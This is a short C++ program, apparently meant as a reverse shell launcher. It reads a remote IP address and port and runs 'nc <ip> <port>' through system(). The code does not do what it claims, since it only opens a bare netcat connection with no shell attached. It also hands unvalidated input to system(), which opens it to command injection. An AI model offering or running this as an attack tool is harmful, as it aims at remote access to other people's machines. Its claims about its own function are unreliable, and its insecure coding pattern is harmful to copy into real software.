#include <iostream>
#include <string>
#include <cstdlib>

using namespace std;

int main() {
    string ip, port;

    cout << "Enter the IP address of the remote host: ";
    cin >> ip;

    cout << "Enter the port number to use for the reverse shell: ";
    cin >> port;

    string command = "nc " + ip + " " + port;

    // Create a new process and execute the Netcat command
    system(command.c_str());

    return 0;
}
